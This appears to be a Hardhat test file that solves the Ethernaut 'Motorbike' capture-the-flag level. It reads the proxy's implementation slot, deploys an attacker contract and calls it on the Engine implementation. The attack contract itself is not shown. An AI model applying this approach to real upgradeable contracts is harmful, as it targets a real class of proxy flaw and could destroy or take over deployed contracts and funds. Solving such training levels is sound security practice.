import { loadFixture } from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { expect } from "chai";
import hre from "hardhat";

import { Motorbike, MotorbikeFactory, MotorbikeFactory__factory, Motorbike__factory } from "../typechain-types";
import { MyMotorbikeAttack, MyMotorbikeAttack__factory } from "../typechain-types";
import { Engine, Engine__factory } from "../typechain-types";
import { FixtureContext, FixtureLevel, deployEssentials, deployLevel } from "./fixtures";
import { completeLevel } from "./helpers";

describe("25. Motor", function () {
  let context: FixtureContext;
  let level: FixtureLevel<MotorbikeFactory, Motorbike>;

  beforeEach(async function () {
    context = await loadFixture(deployEssentials);
    level = await deployLevel(context, MotorbikeFactory__factory, (address, signer) =>
      Motorbike__factory.connect(address, signer),
    );
  });

  it("should be attacked successfully through attacker contract", async function () {
    //get implementation address
    const implAddress = await hre.ethers.provider.getStorage(
      level.instance,
      BigInt("0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"),
    );

    // get engine instance
    const engine: Engine = Engine__factory.connect("0x" + implAddress.slice(-40), context.player);

    // deploy attacker contract
    const attackFactory: MyMotorbikeAttack__factory = new MyMotorbikeAttack__factory(context.player);
    const attackContract: MyMotorbikeAttack = await attackFactory.deploy();
    await attackContract.waitForDeployment();

    const tx = await attackContract.attack(await engine.getAddress());
    await tx.wait();

    // We don't check level completeness.
    // The level checks Engine's contract codesize, but after Cancun upgrade SELFDESTRUCT doesn't remove
    // neither contract code nor storage (except selfdestruct happened in constructor).
    // So level we'll not report level completeness.
    // discussion: https://github.com/OpenZeppelin/ethernaut/issues/701
    // await completeLevel(context, level);
  });
});
